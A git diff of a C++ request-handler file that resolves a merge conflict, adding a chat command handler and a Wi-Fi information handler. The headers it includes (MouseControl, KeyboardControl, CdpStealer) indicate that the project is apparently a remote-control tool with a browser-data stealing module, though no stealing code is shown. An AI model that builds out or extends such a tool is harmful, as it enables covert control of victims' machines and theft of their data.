@@ -9,11 +9,8 @@
 #include "MouseControl.h"
 #include "CdpStealer.h"
 #include "KeyboardControl.h"
-<<<<<<< HEAD
 #include "ChatManager.h"
-=======
 #include "WifiSearcher.h"
->>>>>>> 02068f77e864c983d0dc5376b02d306313613b60
 
 // Helper: Trả về JSON status chuẩn
 json ProcessHandlers::makeStatus(bool success, const std::string &msg, json extra)
@@ -288,7 +285,6 @@ json ProcessHandlers::handleKeyboardInput(const json &req)
     return {};
 }
 
-<<<<<<< HEAD
 // === CHAT SYSTEM ===
 json ProcessHandlers::handleChatCommand(const json &req)
 {
@@ -316,13 +312,14 @@ json ProcessHandlers::handleChatCommand(const json &req)
     }
 
     return makeStatus(false, "Unknown chat command");
-=======
-json ProcessHandlers::getWifiInfo(const json &) {
-    json wifiData = WifiSearcher::getWifiInfo(); 
-    
+}
+
+json ProcessHandlers::getWifiInfo(const json &)
+{
+    json wifiData = WifiSearcher::getWifiInfo();
+
     wifiData["type"] = "wifi_info";
     wifiData["success"] = true;
 
     return wifiData;
->>>>>>> 02068f77e864c983d0dc5376b02d306313613b60
 }
